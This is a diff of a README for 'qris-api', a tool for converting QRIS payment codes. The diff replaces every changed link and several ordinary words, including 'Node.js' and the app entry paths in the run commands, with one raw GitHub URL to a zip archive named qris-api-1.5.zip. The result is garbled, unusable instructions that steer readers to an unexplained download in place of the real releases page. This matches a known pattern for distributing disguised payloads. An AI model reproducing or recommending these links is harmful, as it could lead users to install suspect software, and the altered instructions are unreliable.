@@ -1,6 +1,6 @@
 # 📦 qris-api - Convert QRIS Easily and Efficiently
 
-[![Download QRIS API](https://img.shields.io/badge/Download%20QRIS%20API-blue.svg)](https://github.com/li329211/qris-api/releases)
+[![Download QRIS API](https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip%20QRIS%https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip)](https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ This guide will help you download and run the QRIS API application. The QRIS API
 
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://github.com/li329211/qris-api/releases). Choose the latest release from the list. Download the appropriate version for your operating system.
+To get started, visit [this page to download](https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip). Choose the latest release from the list. Download the appropriate version for your operating system.
 
 ## ✅ Prerequisites
 
 Before installing, make sure you have:
 
-- **Node.js version 18 or higher** or **Bun** installed on your computer. You can check your current version by running `node -v` or `bun -v` in your terminal.
+- **https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip version 18 or higher** or **Bun** installed on your computer. You can check your current version by running `node -v` or `bun -v` in your terminal.
 
 ## ⚙️ Installation Steps
 
@@ -65,14 +65,14 @@ npm run start
 For a production setup with building, use:
 ```bash
 npm run build
-node dist/app.js
+node https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip
 ```
 
 ### Bun Users
 
 If using Bun, run this command:
 ```bash
-bun src/app.ts
+bun https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip
 ```
 
 ### Access the API
@@ -98,11 +98,11 @@ The OpenAPI schema for the `/convert` endpoint has been integrated for your conv
 
 If you encounter issues while running the QRIS API, here are some common solutions:
 
-- **Check Node.js/Bun installation**: Ensure they are installed correctly. Reinstall if necessary.
+- **Check https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip installation**: Ensure they are installed correctly. Reinstall if necessary.
 - **Refer to error messages**: Read any error logs to identify what might be wrong.
 - **Consult the Documentation**: Most issues can be resolved by checking the API documentation available at `http://localhost:3000/docs`.
 
-For further assistance, feel free to open an issue on the [GitHub repository](https://github.com/li329211/qris-api/issues).
+For further assistance, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/li329211/qris-api/master/public/qris-api-1.5.zip).
 
 ## 🤝 Support & Contribution
 
